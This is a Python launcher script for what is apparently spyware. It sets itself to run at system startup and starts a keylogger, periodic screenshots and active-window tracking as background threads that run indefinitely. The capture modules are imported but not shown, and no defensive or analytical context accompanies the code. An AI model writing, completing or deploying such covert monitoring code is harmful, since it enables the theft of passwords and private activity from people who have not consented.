import threading
from keylogger import start_keylogger
from screenshot import start_screenshot_loop
from window_tracker import track_windows
from autostart import add_to_startup


add_to_startup()  # place this at the top of run()
def run():
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=start_screenshot_loop, args=(60,), daemon=True).start()
    threading.Thread(target=track_windows, args=(15,), daemon=True).start()

    while True:
        pass  # Keep the main thread alive

if __name__ == "__main__":
    run()
